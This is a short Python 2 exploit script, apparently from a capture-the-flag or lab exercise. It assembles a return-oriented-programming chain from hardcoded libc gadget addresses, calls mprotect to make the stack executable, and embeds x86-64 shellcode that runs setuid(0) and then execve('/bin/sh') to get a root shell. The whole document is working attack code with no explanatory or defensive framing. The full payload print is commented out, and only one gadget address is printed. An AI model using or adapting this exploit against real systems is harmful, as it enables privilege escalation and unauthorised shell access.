import sys
import struct

addr_libc = 0x7ffff7a0d000


double_pop_addr = struct.pack("<Q", 0x0000000000117919 + addr_libc)



shellcode = "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x68\x50\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
shell_addr = "\x00\x00\x7f\xff\xff\xff\xd6\xe0"[::-1]
padding = 'a'*0x18
p_rax_addr = struct.pack("<Q", 0x0000000000033544 + addr_libc)
mprotect_syscall = struct.pack("<Q", 0x0000000000000008) # code of mprotect
add_rax_addr = struct.pack("<Q", 0x00000000000abf37 + addr_libc)
p_rdi_addr = struct.pack("<Q", addr_libc + 0x0000000000021102)
stack_addr = struct.pack("<Q", 0x7ffffffdd000)
p_rsi_addr = struct.pack("<Q", addr_libc + 0x00000000000202e8)
stack_len = struct.pack("<Q", 0x0000000000022000) # size of the stack
p_rdx_addr = struct.pack("<Q", addr_libc + 0x0000000000001b92)
permission_code = struct.pack("<Q", 0x00000000000007) # code of all permission
syscall = struct.pack("<Q", 0x7ffff7b14e05)

#print padding + p_rax_addr + mprotect_syscall + add_rax_addr  + p_rdi_addr + stack_addr + p_rsi_addr + stack_len + p_rdx_addr + permission_code + syscall + shell_addr + "\x90"*256 + shellcode
print double_pop_addr
